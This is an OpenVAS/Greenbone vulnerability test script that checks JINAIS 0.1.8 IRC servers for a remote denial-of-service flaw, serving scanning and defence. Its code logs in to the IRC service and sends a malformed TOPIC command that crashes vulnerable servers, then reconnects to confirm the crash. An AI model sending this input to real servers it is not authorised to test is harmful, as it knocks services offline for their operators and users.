# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100554");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-03-26 13:01:50 +0100 (Fri, 26 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("JINAIS IRC Message Remote Denial Of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38972");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl", "ircd.nasl");
  script_require_ports("Services/irc", 4002);
  script_mandatory_keys("ircd/detected");

  script_tag(name:"summary", value:"JINAIS is prone to a remote denial-of-service vulnerability.");

  script_tag(name:"impact", value:"An attacker may exploit this issue to crash the application, resulting
  in a denial-of-service condition.");

  script_tag(name:"affected", value:"JINAIS 0.1.8 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:4002, proto:"irc");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

vtstrings = get_vt_strings();
NICK = vtstrings["default_rand"];

send(socket:soc, data:string("NICK ", NICK, "\r\n"));
buf = recv(socket:soc, length:256);
if(isnull(buf)) {
  close(soc);
  exit(0);
}

send(socket:soc, data:string("USER ", NICK, "\r\n"));
buf = recv(socket:soc, length:1024);
if(NICK >!< buf) {
  close(soc);
  exit(0);
}

send(socket:soc, data:string("TOPIC #", NICK, "\r\n"));
buf = recv(socket:soc, length:256);
close(soc);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
} else {
  close(soc1);
}

exit(99);
